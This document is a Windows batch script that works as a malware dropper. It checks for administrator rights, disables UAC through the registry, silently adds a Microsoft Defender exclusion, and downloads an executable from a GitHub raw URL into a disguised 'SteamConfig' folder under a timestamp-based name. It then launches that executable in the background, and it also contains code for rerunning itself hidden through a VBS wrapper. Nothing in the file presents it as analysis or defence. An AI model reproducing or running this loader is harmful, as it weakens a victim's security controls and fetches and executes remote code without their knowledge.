@echo off
setlocal enabledelayedexpansion

net session >nul 2>&1
if %errorlevel% neq 0 exit /b 1

for /f "tokens=2 delims==" %%I in ('"wmic os get localdatetime /value"') do set datetime=%%I
set randomExeName=%datetime:~8,4%%datetime:~4,2%%datetime:~6,2%%datetime:~2,2%%datetime:~0,2%.exe

set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
set "exePath=%folderPath%\%randomExeName%"

if not exist "%folderPath%" mkdir "%folderPath%"

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess '%exePath%'" >nul 2>&1

curl -L -o "%exePath%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/vmtest.exe" >nul 2>&1
if %errorlevel% neq 0 exit /b 1

if not exist "%exePath%" exit /b 1
for %%F in ("%exePath%") do set filesize=%%~zF
if "%filesize%"=="0" exit /b 1

start "" /b "%exePath%"
exit

echo Set objShell = CreateObject("WScript.Shell") > "%TEMP%\run_silently.vbs"
echo objShell.Run """%~f0""", 0, False >> "%TEMP%\run_silently.vbs"

wscript "%TEMP%\run_silently.vbs"
